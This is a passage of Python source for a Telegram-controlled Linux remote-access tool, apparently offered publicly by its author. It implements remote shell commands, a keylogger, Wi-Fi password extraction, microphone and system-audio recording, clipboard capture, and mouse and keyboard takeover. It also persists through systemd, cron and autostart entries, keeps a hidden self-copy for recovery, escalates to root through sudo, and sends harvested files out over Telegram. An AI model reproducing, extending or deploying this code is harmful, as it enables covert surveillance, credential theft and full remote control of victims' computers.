                    r, 
                    headers=(
                        'ID',              'NAME', 
                        'SESSION-DATE',    'REGISTRATION-DATE'
                    ), 
                    tablefmt='grid'
                ), 
                doc='account.txt') 
                return
            
            elif exp := parse_cmd(r'-d\s*(?P<id>\d+)', args):
                idx = int(exp['id'])
                p   = f'{PATH_MEM}/{mem_id(idx)}'
                

                if _isfile(p):
                    SESSION.pop(idx, None)
                    _remove(p)

                    send(f'account is deleted ({idx}) [+]')
                else:
                    send(f'account does not exist ({idx}) [*]')


                return
            
        case 'autostart':
            sep = '\u200B'


            if args == '-l':
                try:
                    dt = decrypt(read_file(FILE_AUTOSTART))
                except Exception:
                    send('no files in bot autostart [*]')
                    return
                

                r = []

                with StringIO(dt) as buf:
                    for l in buf:
                        try:
                            bname, bpath, bargs, bdate = l.split(sep)
                            r.append((bname, bpath, bargs, bdate))
                        except ValueError:
                            continue


                send(tabulate(
                    r, 
                    headers=('NAME', 'PATH', 'ARGUMENTS', 'DATE'), 
                    tablefmt='grid'
                ), doc='autostart.txt') if r else send('no files in bot autostart [*]')
                return
            
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                bname, bpath, bargs, date = exp['name'], exp['path'], exp['args'], get_date()

                bpath = (
                        _absp(bpath) 
                    if _isfile(bpath) else 
                        f'{PATH_SHARE}/{bpath}'
                )
  

                if not _isfile(bpath):
                    send(f'file does not exist ({_namep(bpath)}) [*]')
                    return
 
                if not _isfile(FILE_AUTOSTART):
                    write_file(FILE_AUTOSTART, '')


                rc = f'{bname}{sep}{bpath}{sep}{bargs}{sep}{date[0]} | {date[1]}'

                send(
                        f'added file ({bname}) in bot autostart [+]' 
                    if change_file(FILE_AUTOSTART, bname, rc, enc=True) else 
                        f'failed to add file ({bname}) in bot autostart [-]'
                )
                return  
            
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                bname = exp['name']
                
                if _isfile(FILE_AUTOSTART):
                    send(
                            f'deleted file from bot autostart ({bname}) [+]' 
                        if change_file(FILE_AUTOSTART, bname, bname, delete=True, enc=True) else 
                            f'file does not exist ({bname}) in bot autostart [*]'
                    )
                else: 
                    send('no files in bot autostart [*]')

                return
            
            elif args == '-r':
                if _isfile(FILE_AUTOSTART):
                    write_file(FILE_AUTOSTART, '')
                    send('bot autostart is reset [+]')
                else:
                    send('no files in bot autostart [*]')

                return
            
        case 'cd':
            if _isdir(args):
                try:
                    os.chdir(args)
                    send(f'directory changed ({args}) [+]\n\nDIRECTORY : {os.getcwd()}')
                except PermissionError:
                    send(f'permission denied ({args}) [-]')
            else:
                send(f'directory does not exist ({args}) [*]')

            return
        
        case 'ls':
            if _isdir(args):
                r = ls(args)
                send(r, doc='ls.txt') if r else send(NULL)
            else:
                send(f'directory does not exist ({args}) [*]')

            return

        case 'mkfile':
            if exp := parse_cmd(r'(?P<path>.*?)\s*-d\s*(?P<data>.+)', args):
                p = exp['path']

                try:
                    write_file(
                        p, 
                        exp['data'].replace('\\t', '\t'
                                  ).replace('\\n', '\n')
                    )
                    send(f'file is created ({p}) [+]')
                except OSError:
                    send(f'failed to create file ({p}) [-]')

                return
            
        case 'mkdir':
            try:
                mkdir(args)
                send(f'dir is created ({args}) [+]')
            except OSError:
                send(f'failed to create dir ({args}) [-]')
            
            return
        
        case 'rn':           
            if exp := parse_cmd(r'(?P<name>.*?)\s*-n\s*(?P<new_name>.+)', args):
                cur, new = exp['name'], exp['new_name']
                
                p = os.path.dirname(_absp(cur))

                if _exist(cur):
                    try:
                        os.rename(cur, f'{p}/{new}')
                        send(f'path is renamed ({cur}) --> ({new}) [+]')
                    except OSError:
                        send(f'failed to rename path ({cur}) [-]')
                else:
                    send(f'path does not exist ({cur}) [*]')

                return
            
        case 'rm':
            if _isfile(args):
                try:
                    _remove(args)
                    send(f'file is deleted ({args}) [+]')
                except OSError:
                    send(f'failed to delete file ({args}) [-]')
            else:
                send(f'file does not exist ({args}) [*]')

            return
        
        case 'rmdir':
            if _isdir(args):
                try:
                    shutil.rmtree(args)
                    send(f'dir is deleted ({args}) [+]')
                except OSError:
                    send(f'failed to delete dir ({args}) [-]')
            else:
                send(f'dir does not exist ({args}) [*]')
            
            return
        
        case 'cp':        
            if exp := parse_cmd(r'(?P<from_path>.*?)\s*-t\s*(?P<to_path>.+)', args):
                fph, tph = exp['from_path'], exp['to_path']

                if _exist(fph):
                    try:
                        (
                            shutil.copy 
                        if _isfile(fph) else 
                            shutil.copytree
                        )(fph, tph)
                        send(f'path is copied ({fph}) --> ({tph}) [+]')
                    except OSError:
                        send(f'failed to copy path ({fph}) [-]')
                else:
                    send(f'path does not exist ({fph}) [*]')

                return
            
        case 'mv':           
            if exp := parse_cmd(r'(?P<from_path>.*?)\s*-t\s*(?P<to_path>.+)', args):
                fph, tph = exp['from_path'], exp['to_path']

                if _exist(fph):
                    try:
                        shutil.move(fph, tph)
                        send(f'path is moved ({fph}) --> ({tph}) [+]')
                    except OSError:
                        send(f'failed to move path ({fph}) [-]')
                else:
                    send(f'path does not exist ({fph}) [*]')

                return
            
        case 'chmod':
            if exp := parse_cmd(r'(?P<path>.*?)\s*-m\s*(?P<mode>\d+)', args):
                p, m = exp['path'], int(exp['mode'], base=8)

                if not _exist(p):
                    send(f'path does not exist ({p}) [*]')
                    return


                try:
                    os.chmod(p, m)
                    send(f'changed path mode ({p}) --> ({m}) [+]')
                except OSError:
                    send(f'failed to change path mode ({p}) [-]')
                

                return
            
        case 'hide':
            if _exist(args):
                send(
                        f'path is hidden ({args}) [+]' 
                    if hide(args) else 
                        f'failed to hide path ({args}) [-]'
                )
            else:
                send(f'path does not exist ({args}) [*]')
            
            return
        
        case 'unhide':
            if _exist(args):
                send(
                        f'path is unhidden ({args}) [+]' 
                    if unhide(args) else 
                        f'failed to unhide path ({args}) [-]')
            else:
                send(f'path does not exist ({args}) [*]')
            
            return
        
        case 'cat':
            if _isfile(args):
                try:
                    sz = os.stat(args).st_size

                    if sz > FILE_SZ_LIMIT:
                        send(f'maximum file size limit is {FILE_SZ_LIMIT >> 20} MiB [*]')
                        return


                    dt = read_file(args, b=True)
                    send(dt, doc=_namep(args)) if dt else send(f'file is empty ({args}) [*]')
                except Exception:
                    send(f'failed to download file ({args}) [-]')
            else:
                send(f'file does not exist ({args}) [*]')

            return
        
        case 'zip':
            if _isdir(args):
                cur = f'{_namep(args)}.zip'

                try:
                    dt = make_zip(args)
                    send(dt, doc=cur)
                except Exception:
                    send(f'failed to make archive ({cur}) [-]') 
            else:
                send(f'directory does not exist ({args}) [*]')

            return
         
        case 'inet':
            if args == '-e':
                shell('nmcli networking on')
                return
            elif args == '-d':
                shell('nmcli networking off')
                return
            
        case 'wifi':
            if args == '-g':
                r = wifi()

                send(r, doc='wifi.txt') if r else send(NULL)
                return
            
            elif args == '-p':
                r = wifi_password()

                send(r, doc='wifi_password.txt') if r else send(NULL)
                return
            
        case 'site':           
            if exp := parse_cmd(r'-p\s*(?P<url>.+)', args):
                url = exp['url']

                try:
                    open_site(url)
                    send(f'website is opened ({url}) [+]')
                except Exception:
                    send(f'failed to open website ({url}) [-]')
                
                return
            
            elif exp := parse_cmd(r'-d\s*(?P<url>.*?)\s*-n\s*(?P<name>.+)', args):
                url, name = exp['url'], exp['name']


                req = http(url)

                if req is None:
                    send(f'failed to query website ({url}) [*]')
                    return


                try:
                    write_file(f'{PATH_SHARE}/{name}', req)
                    send(f'file is downloaded from website ({url}) --> ({name}) [+]')
                except OSError:
                    send(f'failed to download from website ({url}) [-]')

                return
            
            elif args == '-l':
                if _isfile(PATH_HOSTS):
                    r = []

                    with StringIO(read_file(PATH_HOSTS)) as buf:
                        for l in buf:
                            i = l.split()

                            if (len(i) > 4) and (i[2] == '#'):
                                r.append((i[1], f'{i[-1]} | {i[-2]}'))

                    send(tabulate(
                        r, 
                        headers=('DOMAIN', 'DATE'), 
                        tablefmt='grid'
                    ), doc='blocked_sites.txt') if r else send('no blocked sites [*]')
    
                else:
                    send('no blocked sites [*]')


                return  
            
            elif exp := parse_cmd(r'-b\s*(?P<domain>.+)', args):
                domain = exp['domain']

                try:
                    verify_domain(domain)
                except OSError:
                    send(f'domain does not exist ({domain}) [*]')
                    return
                

                if not _isfile(PATH_HOSTS):
                    write_file(PATH_HOSTS, '')


                date = get_date()
                rc   = f'127.0.0.1 {domain} # {date[0]} {date[1]}'

                send(
                        f'site is blocked ({domain}) [+]' 
                    if change_file(PATH_HOSTS, domain, rc) else 
                        f'failed to block site ({domain}) [-]'
                )
                return
            
            elif exp := parse_cmd(r'-d\s*(?P<domain>.+)', args):
                domain = exp['domain']

                if _isfile(PATH_HOSTS):
                    send(
                            f'site is unblocked ({domain}) [+]' 
                        if change_file(PATH_HOSTS, domain, domain, delete=True) else 
                            f'site does not exist ({domain}) [*]'
                    ) 
                else:
                    send('no blocked sites [*]')
                
                return
            
            elif args == '-r':
                if _isfile(PATH_HOSTS):
                    write_file(PATH_HOSTS, '')
                    send('sites is unblocked [+]')
                else:
                    send('no blocked sites [*]')
                    
                return
            
        case 'modprobe':
            if args == '-g':
                r = modprobe('get')

                send(r, doc='modprobe.txt') if r else send(NULL)
                return
            
            elif exp := parse_cmd(r'(?P<mode>-i|-d)\s*(?P<name>.+)', args):
                c, mod = 'installed' if exp['mode'] == '-i' else 'deleted', exp['name']

                send(
                        f'modprobe module is {c} ({mod}) [+]' 
                    if modprobe(c, mod) else 
                        f'failed to {c} modprobe module ({mod}) [-]'
                )
                return
            
        case 'service':
            if args == '-g':
                r = systemctl('get')

                send(r, doc='service.txt') if r else send(NULL)
                return
            
            elif exp := parse_cmd(r'-q\s*(?P<name>.+)', args):
                name = exp['name']

                r = systemctl('query', name)

                send(r, doc='service.txt') if r else send(f'service does not exist ({name}) [*]')
                return
            
            elif args == '-u':
                send(
                        'service is updated [+]' 
                    if systemctl('update') else 
                        'failed to update service [-]'
                )
                return      
            
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-d\s*(?P<description>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.*?)\s*-u\s*(?P<user>root|user)', args):
                send(systemctl(
                    'create',
                    name=exp['name'], 
                    description=exp['description'], 
                    path=exp['path'], 
                    args=exp['args'], 
                    root=exp['user'] == 'root'
                ))
                return
            
            elif exp := parse_cmd(r'(?P<mode>-d|-e|-i|-l|-r|-s)\s*(?P<name>.+)', args):
                name = exp['name']

                match exp['mode']:
                    case '-d':
                        send(systemctl('delete', name))
                    case '-e':
                        send(systemctl('enable', name))
                    case '-i':
                        send(systemctl('disable', name))
                    case '-l':
                        send(systemctl('start', name))
                    case '-r':
                        send(systemctl('restart', name))
                    case '-s':
                        send(systemctl('stop', name))
                    
                return
            
        case 'crontab':
            if args == '-g':
                r = crontab('get')

                send(r, doc='crontab.txt') if r else send('crontab is empty [*]')
                return
            
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-e\s*(?P<event>.*?)\s*-u\s*(?P<user>root|user)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                send(crontab(
                    'create',
                    name=exp['name'],
                    event=exp['event'],
                    root=exp['user'] == 'root',
                    path=exp['path'],
                    args=exp['args']
                ))
                return
            
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                send(crontab('delete', exp['name']))
                return 
            
        case 'startup':
            if args == '-g':
                r = startup('get')

                send(r if r else 'startup is empty [*]')
                return 
            
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                send(startup(
                    'create', 
                    name=exp['name'],
                    path=exp['path'],
                    args=exp['args']
                    ))
                return
            
            elif exp := parse_cmd(r'(?P<mode>-d|-l)\s*(?P<name>.+)', args):
                send(startup(
                    'delete' if exp['mode'] == '-d' else 'start', 
                    exp['name']
                ))
                return
            
        case 'env':
            if args == '-g':
                r = env('get')

                send(r, doc='environment.txt') if r else send(NULL)
                return
            
            elif exp := parse_cmd(r'-q\s*(?P<key>.+)', args):
                k = exp['key']

                r = env('query', k) 

                send(r) if r else send(f'environment key does not exist ({k}) [*]')
                return
            
            elif exp := parse_cmd(r'-c\s*(?P<key>.*?)\s*-v\s*(?P<value>.+)', args):
                send(env(
                    'create', 
                    exp['key'], 
                    exp['value']
                ))
                return
            
            elif exp := parse_cmd(r'-d\s*(?P<key>.+)', args):
                send(env('delete', exp['key']))
                return
            
            elif args == '-b':
                init_user()

                with StringIO() as r:
                    au = r.write

                    for (k, v) in _env.items():
                        au(f'{k}={v}\n')


                    send(r.getvalue(), doc='botenv.txt')
                    return
            
            elif exp := parse_cmd(r'-g\s*(?P<key>.+)', args):
                k = exp['key']

                send(_env.get(
                    k, 
                    f'bot environment key does not exist ({k}) [*]'
                ))
                return
            
            elif exp := parse_cmd(r'-s\s*(?P<key>.*?)\s*-v\s*(?P<value>.+)', args):
                k, v = exp['key'], exp['value']

                try:
                    _env[k] = v
                    send(f'bot environment key is set ({k}) [+]')
                except Exception:
                    send(f'failed to set bot environment key ({k}) [-]')

                return
            
        case 'user':
            if args == '-g':
                r = user('get')

                send(r, doc='user.txt') if r else send(NULL)
                return
            
            elif exp := parse_cmd(r'-q\s*(?P<name>.+)', args):
                name = exp['name']

                r = user('get', name)

                send(r) if r else send(f'user does not exist ({name}) [*]')
                return
            
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-p\s*(?P<password>.+)', args):
                uname, upass = exp['name'], exp['password']

                send(user('create', uname, upass))
                return 
            
            elif exp := parse_cmd(r'-d\s*(?P<name>.*?)', args):
                send(user('delete', exp['name']))
                return 
            
        case 'block':
            if args == '-l':
                try:
                    dt = decrypt(read_file(FILE_APP_BLOCKER))
                except Exception:
                    send('no blocked apps [*]')
                    return
                

                r   = []
                sep = '='

                with StringIO(dt) as buf:
                    for l in buf:
                        i = l.split(sep)

                        if len(i) == 2:
                            r.append((i[0], i[1]))
                

                send(r, doc='blocked_apps.txt') if r else send('no blocked apps [*]')
                return
            
            elif exp := parse_cmd(r'-b\s*(?P<name>.+)', args):
                name, date = exp['name'], get_date()


                if not _isfile(FILE_APP_BLOCKER):
                    write_file(FILE_APP_BLOCKER, '')


                rc = f'{name}={date[0]} | {date[1]}'

                send(
                        f'app is blocked ({name}) [+]' 
                    if change_file(FILE_APP_BLOCKER, name, rc, enc=True) else 
                        f'failed to block app ({name}) [-]'
                )
                return
            
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                name = exp['name']

                if _isfile(FILE_APP_BLOCKER):
                    send(
                            f'app is unblocked ({name}) [+]' 
                        if change_file(FILE_APP_BLOCKER, name, name, delete=True, enc=True) else 
                            f'app does not exist ({name}) [*]'
                    ) 
                else:
                    send('no blocked apps [*]')
                
                return
            
            elif args == '-r':
                if _isfile(FILE_APP_BLOCKER):
                    write_file(FILE_APP_BLOCKER, '')
                    send('apps is unblocked [+]')
                else:
                    send('no blocked apps [*]')

                return
            
        case 'kill':
            send(
                    f'killed ({args}) [+]' 
                if kill(args) else 
                    f'failed to kill ({args}) [-]'
            )
            return
        
        case 'run':
            if exp := parse_cmd(r'(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                p, arg = exp['path'], exp['args']


                ok = launch(
                    p, 
                    '' if arg == 'none' else arg
                )


                if ok is None:
                    send(f'path does not exist ({p}) [*]')
                else:
                    send(
                            f'ran file ({p}) [+]' 
                        if ok else 
                            f'failed to run file ({p}) [-]'
                    ) 

                return
            
        case 'cmd':
            if exp := parse_cmd(r'(?P<output>-e|-g)\s*(?P<command>.+)', args):
                o, c = exp['output'] == '-g', exp['command']


                if o:
                    ex = shell(c, output=True)
                    send(ex, doc='cmd.txt') if ex else send(f'command not found ({c}) in cmd [*]')
                else:
                    send(
                            f'cmd command is executed ({c}) [+]' 
                        if shell(c) else 
                            f'failed to execute cmd command ({c}) [-]'
                    )


                return
            
        case 'time':
            if args == '-g':
                send(get_date()[0])
                return
            elif exp := parse_cmd(r'-s\s*(?P<time>.+)', args):
                t = exp['time']
                send(
                        f'time is changed ({t}) [+]' 
                    if shell(f'date +%T -s {t}') else 
                        f'time is invalid ({t}) [-]'
                ) 
                return
            
        case 'date':
            if args == '-g':
                send(get_date()[1])
                return
            elif exp := parse_cmd(r'-s\s*(?P<date>.+)', args):
                d = exp['date']
                send(
                        f'date is changed ({d}) [+]' 
                    if shell(f'date +%F -s {d}') else 
                        f'date is invalid ({d}) [-]'
                )
                return    
               
        case 'mouse':
            if args == '-p':
                x, y = mouse.get_position()

                send(f'mouse position ({x}x{y}) [+]')
                return
            
            elif exp := parse_cmd(r'-x\s*(?P<x>\d+)\s*-y\s*(?P<y>\d+)\s*-d\s*(?P<delay>\d+)', args):
                x, y, delay = int(exp['x']), int(exp['y']), int(exp['delay'])

                mouse.move(x, y, duration=delay)
                send(f'mouse is moved ({x}x{y}) [+]')
                return
            
            elif exp := parse_cmd(r'(?P<button>-l|-r|-m)\s*-c\s*(?P<click>\d+)\s*-d\s*(?P<delay>\d+)', args):
                click, delay, button = int(exp['click']), int(exp['delay']), exp['button']

                match button:
                    case '-l':
                        button  = 'left'
                        btn     = mouse.LEFT
                    case '-r':
                        button  = 'right'
                        btn     = mouse.RIGHT
                    case '-m':
                        button  = 'middle'
                        btn     = mouse.MIDDLE
                            
                            
                for _ in range(click):
                    mouse.press(btn)
                    sleep(delay)
                    mouse.release(btn)


                send(f'mouse button ({button}) is clicked ({click}) [+]')
                return
            
            elif exp := parse_cmd(r'-s\s*(?P<amount>-*\d+)', args):
                amount = int(exp['amount'])

                mouse.wheel(amount)
                send(f'mouse is scrolled ({amount}) [+]')
                return
            
        case 'keyboard':
            if exp := parse_cmd(r'-t\s*(?P<text>.*?)\s*-d\s*(?P<delay>\d+)', args):
                txt, delay = exp['text'], int(exp['delay'])

                kb.write(txt, delay)
                send('keyboard wrote [+]')
                return
            
            elif exp := parse_cmd(r'-k\s*(?P<key>.*?)\s*-p\s*(?P<amount>\d+)\s*-d\s*(?P<delay>\d+)', args):
                key, amount, delay = exp['key'], int(exp['amount']), int(exp['delay'])


                for _ in range(amount):
                    try:
                        kb.press(key)
                        sleep(delay)
                        kb.release(key)
                    except Exception:
                        send(f'keyboard key is invalid ({key}) [-]')
                        return

                
                send(f'keyboard key ({key}) is pressed ({amount}) [+]')
                return
            
            elif exp := parse_cmd(r'-c\s*(?P<type>-k|-h)\s*(?P<key>.*?)\s*-n\s*(?P<new_key>.+)', args):
                typ, key, nwk = exp['type'], exp['key'], exp['new_key']

                try:
                    (
                        kb.remap_key 
                    if typ == '-k' else 
                        kb.remap_hotkey
                    )(key, nwk)
                    send(
                        'remapped keyboard ' + (
                            'key' if typ == '-k' else 'hotkey'
                        ) + f' ({key}) --> ({nwk}) [+]'
                    )
                except Exception:
                    send(
                        'failed to remap keyboard ' + (
                            'key' if typ == '-k' else 'hotkey'
                        ) + f' ({key}) [-]'
                    )

                return
            
            elif exp := parse_cmd(r'-b\s*(?P<key>.+)', args):
                key = exp['key']

                try:
                    kb.block_key(key)
                    send(f'keyboard key is blocked ({key}) [+]')
                except Exception:
                    send(f'failed to block keyboard key ({key}) [-]')

                return
            
            elif args == '-r':
                kb.unhook_all()
                send(f'keyboard keys is unblocked [+]')
                return  
            
        case 'clipboard':
            if args == '-g':
                dt = cb.paste()

                send(dt, doc='clipboard.txt') if dt else send('clipboard is empty [*]')
                return
            
            elif exp := parse_cmd(r'-c\s*(?P<data>.+)', args):
                cb.copy(exp['data'])
                send('copied to clipboard [+]')
                return
            
            elif args == '-r':
                cb.copy('')
                send(f'clipboard is cleared [+]')
                return
            
        case 'audio':
            if exp := parse_cmd(r'(?P<type>-m|-p)\s*(?P<second>\d+)', args):
                typ, s = 'system' if exp['type'] == '-p' else 'microphone', int(exp['second'])

                if s > 600:
                    send(f'maximum sound limit is 600 seconds [*]')
                    return
                

                send(f'audio start record {typ} ({s}s) [*]')
                mp3 = audio(typ, s)

                
                send(mp3, doc='audio.mp3') if mp3 else send('failed to record audio [-]')
                return
            
            elif exp := parse_cmd(r'-s\s*(?P<path>.+)', args):
                p = exp['path']
                c = f'ffplay -nodisp -autoexit -loglevel quiet {quote(p)}'


                if _isfile(p):
                    send(f'audio is playing ({p}) [*]')
                    send( 
                            f'audio is played ({p}) [+]'
                        if shell(c) else
                            f'failed to play audio ({p}) [-]'
                    )  
                else:
                    send(f'audio does not exist ({p}) [*]')


                return
            
        case 'msg':
            if exp := parse_cmd(r'(?P<type>-p|-s)\s*(?P<title>.*?)\s*-t\s*(?P<text>.+)', args):
                typ   = exp['type']
                title = exp['title'].replace('\\t', '\t').replace('\\n', '\n') 
                txt   = exp['text' ].replace('\\t', '\t').replace('\\n', '\n')
                
                if typ == '-p':      
                    shell(f'notify-send -u critical {quote(title)} {quote(txt)}')
                    send('msg push [+]')
                else:
                    shell(f'xmessage -geometry 400x200 -title {quote(title)} {quote(txt)}')
                    send('msg system [+]')
                    
                return
            
        case 'keylogger':
            if exp := parse_cmd(r'-g\s*(?P<mode>base|char|hotkey|no hotkey)', args):
                if _isfile(FILE_KEYLOGGER):
                    try:
                        dt = keylogger_parser(exp['mode'])
                        send(dt, doc='keylogger.txt') if dt else send('keylogger data is empty [*]')
                    except Exception:
                        send('failed to get keylogger data [-]')
                else:
                    send('keylogger is disabled [*]')
                
                return


            match args:
                case '-e':
                    write_file(FILE_KEYLOGGER_FLAG, '1')
                    send('keylogger is enabled [+]')
                    return
                
                case '-d':
                    write_file(FILE_KEYLOGGER_FLAG, '0')
                    send('keylogger is disabled [+]')
                    return
                
                case '-s':
                    send(
                            'keylogger is enabled [+]' 
                        if (
                            _isfile(FILE_KEYLOGGER_FLAG) and 
                            (read_file(FILE_KEYLOGGER_FLAG) == '1')
                        ) else 
                            'keylogger is disabled [-]'
                    )
                    return   
                
                case '-r':
                    if _isfile(FILE_KEYLOGGER):
                        write_file(FILE_KEYLOGGER, '')
                        send('keylogger data is reset [+]')
                    else:
                        send('keylogger is disabled [*]')

                    return



    send(f'command not found ({cmd})')




def get_root():
    if FLAG_ROOT in argv:
        return


    if (
        not _isfile(PATH_BASH) or 
       (not IS_ROOT and 
        not _isfile(SUDO_EXE))
    ):
        raise PermissionError('root rights are required to execute')
    

    c = ' '.join(quote(a) for a in (SUDO_EXE, pyexe, 
                                    __file__, FLAG_ROOT))


    ex = f'{quote(PATH_BASH)} -c {quote(c)}'
    Process(
        target=lambda: shell(ex, _new=True), 
        daemon=False
    ).start()
    os._exit(0)




def install_lib(name):
    if find_spec(name) is not None:
        return
    
    shell(f'{quote(FILE_PIP)} install {quote(name)}', timeout=30) 
    



def init_libs():
    _e = type(
        '', (), 
        {
            '__call__': lambda _, m: lambda *a, **k: (
                _ for _ in ()).throw(
                    RuntimeError(f'Python module is not installed ({m})')
            ),

            '__getattr__': lambda _, m: (
                _ for _ in ()).throw(
                    RuntimeError(f'Python module method not found ({m})')
            )
        }
    )()



    global TeleBot, ApiException
    from telebot import TeleBot
    from telebot.apihelper import ApiException 


    global _tabl
    try:
        from tabulate import tabulate as _tabl
    except ImportError:
        _tabl = _e('tabulate')


    global detect
    try:
        from chardet import detect
    except ImportError:
        detect = _e('chardet')


    global http_get
    try:
        from requests import get as http_get
    except ImportError:
        http_get = _e('requests')


    global psutil
    try:
        import psutil
    except ImportError:
        psutil = _e('psutil')


    global mouse
    try:
        import mouse
    except ImportError:
        mouse = _e('mouse')


    global kb
    try:
        import keyboard as kb
    except ImportError:
        kb = _e('keyboard')


    global cb
    try:
        import pyperclip as cb
    except ImportError:
        cb = _e('pyperclip')


    global mss, to_png
    try:
        from mss import mss
        from mss.tools import to_png
    except ImportError:
        mss, to_png = _e('mss'), _e('mss')


    global ffmpeg
    try:
        import ffmpeg
    except ImportError:
        ffmpeg = _e('ffmpeg')




def init_bot_exe():
    if not _isfile(BOT_FILE_PATH) and _isfile(BOT_FILE_PATH_HIDDEN):
        shutil.move(BOT_FILE_PATH_HIDDEN, BOT_FILE_PATH)


    p = (
        PATH,
        PATH_MEM,
        PATH_SYS, 
        PATH_CONF,
        PATH_TMP,
        PATH_SHARE
    )

    while True:
        mkdir(p)
        

        if not _isfile(BOT_FILE_PATH_RECOVERY) and _isfile(BOT_FILE_PATH):
            shutil.copy(BOT_FILE_PATH, BOT_FILE_PATH_RECOVERY)
        
        if not _isfile(BOT_FILE_PATH) and _isfile(BOT_FILE_PATH_RECOVERY):
            shutil.copy(BOT_FILE_PATH_RECOVERY, BOT_FILE_PATH)


        if not _isfile(FILE_INIT):
            write_file(
                FILE_INIT, 
                f'#!{PATH_BASH}\nexec {quote(FILE_PYTHON)} {quote(BOT_FILE_PATH)} {FLAG_ROOT}'
            )
            os.chmod(FILE_INIT, 0o755)   


        systemctl(
            'create',
            name=BOT_SERVICE_NAME,
            description=BOT_SERVICE_DESCRIPTION,
            path=FILE_INIT,
            root=True,
            _reload=False
        )


        sleep(3)




def setup():
    global BOT_FILE_PATH_HIDDEN

    if BOT_EXE:
        BOT_FILE_PATH_HIDDEN = hide(__file__, _ret=True)


    mkdir((
        PATH,
        PATH_MEM,
        PATH_SYS, 
        PATH_CONF,
        PATH_TMP,
        PATH_SHARE
    ))
   

    if not _isdir(PATH_VENV):
        shell(f'{quote(pyexe)} -m venv {quote(PATH_VENV)}')

    for l in LIBS:
        install_lib(l)


    try:
        init_libs()
    except ImportError:
        if FLAG_IMPORT in argv:
            raise SystemError('failed to install libraries')
        
        os.execv(
            FILE_PYTHON, 
            [
                FILE_PYTHON, 
                BOT_FILE_PATH_HIDDEN if BOT_EXE else __file__, 
                FLAG_ROOT, 
                FLAG_IMPORT, 
                FLAG_NAME.format(BOT_FILE_NAME)
            ]
        )
        
            
    if BOT_EXE:
        Thread(target=init_bot_exe, daemon=False).start()




def init():
    invalid_type('TOKEN',                   TOKEN,                   str)
    invalid_type('PASSWORD',                PASSWORD,                str)
    invalid_type('SEED',                    SEED,                    int)
    invalid_type('BOT_SERVICE_NAME',        BOT_SERVICE_NAME,        str)
    invalid_type('BOT_SERVICE_DESCRIPTION', BOT_SERVICE_DESCRIPTION, str)


    if len(TOKEN) != 46:
        raise ValueError('Telegram bot (TOKEN) is invalid')
    

    if not PASSWORD:
        raise ValueError('(PASSWORD) is empty')

    
    if SEED < 0:
        raise ValueError('(SEED) must be >= 0')
    

    try:
        decrypt(encrypt(' \t\n\u200B\u200F\u20600123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZабвгдеёжзийклмнопрстуфхцчшщыэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЫЭЮЯЄєЇїІіҐґ'))
    except Exception:
        raise ValueError('(SEED) is invalid')
    

    if not _isdir(os.path.dirname(PATH)):
        raise ValueError('(PATH) is not exist')
    

    if BOT_EXE and not BOT_SERVICE_NAME:
        raise ValueError('(BOT_SERVICE_NAME) is empty')
    

    if BOT_EXE and not BOT_SERVICE_DESCRIPTION:
        raise ValueError('(BOT_SERVICE_DESCRIPTION) is empty')
    

    get_root()
        

    setup()
    Thread(target=autostart,   daemon=True).start()
    Thread(target=app_blocker, daemon=True).start()
    Thread(target=keylogger,   daemon=True).start()




def init_user():
    global LOGGED_USER, PATH_CONF_STARTUP


    LOGGED_USER_UID, LOGGED_USER = get_logged_user()

    if _env.get('LOGGED_USER', '') == LOGGED_USER:
        return

    PATH_CONF_STARTUP = f'/home/{LOGGED_USER}/.config/autostart'



    key, display = get_display(LOGGED_USER_UID)
    xauth        = f'/home/{LOGGED_USER}/.Xauthority'



    if not _isfile(xauth):
        try:
            sc = _scandir(f'{PATH_RUN_USER}/{LOGGED_USER_UID}')
        except OSError:
            xauth = None
        else:
            lb = 'waylandauth'

            for e in sc:
                if lb in e.name:
                    xauth = e.path
                    break
            else:
                xauth = None

            sc.close()



    _env['LOGGED_USER']          = LOGGED_USER
    if key: _env[key]            = display
    if xauth: _env['XAUTHORITY'] = xauth

    


def bot():
    tg = TeleBot(
        TOKEN,
        validate_token=True,
        protect_content=True,
        disable_web_page_preview=True,
        threaded=True,
        num_threads=3
    )


    try:
        tg.get_me()
    except ApiException:
        raise RuntimeError('TOKEN', '(TOKEN) is invalid or unauthorized')



    _date = get_date()
    info  = f'''
GITHUB : https://github.com/vk-candpython
AUTHOR : Vladislav Khudash (17)
VERSION : LINUX

HOST : {NODE}\\\\{USER} 
PLATFORM : {OS[0]} {OS[1]}
DATE : {_date[0]} | {_date[1]}
'''
    


    def send(idx, dt, doc=''):
        if not doc:
            tg.send_message(idx, dt) 
        else:
            if isinstance(dt, str):
                dt = mem(dt.encode())

            tg.send_document(idx, dt, visible_file_name=doc)



    def verify_user(chat_id, user_id, user_name, cmd):
        if user_id in SESSION:
            return True


        p = f'{PATH_MEM}/{mem_id(user_id)}'

        if _isfile(p): 
            date = get_date()
            SESSION[user_id] = (
                f'@{user_name}', 
                f'{date[0]} | {date[1]}',
                lambda dt, doc='': send(chat_id, dt, doc)
            )
            return True
        

        hpass = sha256(cmd.encode()).hexdigest()

        if hpass == PASSWORD:
            date = get_date()
            write_file(p, encrypt(f'{date[0]} | {date[1]}'))
            
            send(chat_id, info)
            return True
        else:
            send(chat_id, 'Enter password to connect to session [!]')
            return False



    @tg.message_handler(content_types=('text',))
    def executor(msg):
        chat_id   = msg.chat.id 
        user_id   = msg.from_user.id 
        user_name = msg.from_user.username
        cmd       = msg.text.strip()


        if not verify_user(chat_id, user_id, user_name, cmd):
            return
        
        elif cmd == 'session':
            send(chat_id, info)
            return
        
        elif cmd == 'exit':
            idx = mem_id(user_id)
